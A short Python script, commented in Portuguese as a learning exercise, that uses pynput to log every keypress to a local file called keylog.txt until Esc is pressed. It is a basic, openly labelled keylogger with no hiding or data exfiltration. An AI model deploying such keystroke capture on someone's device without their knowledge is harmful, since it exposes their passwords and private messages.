# Esse projeto tem carater total de aprendizado, e tem o propósito de ensinar a fazer um script simples
#em python para coletar teclas digitadas, apenas para treinar programação em python.

from pynput import keyboard

def on_press(key):
    with open("keylog.txt", "a") as log_file:
        try:
            log_file.write('{0} pressed \n'.format(key.char))
        except AttributeError:
            log_file.write('{0} pressed \n'.format(key))

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

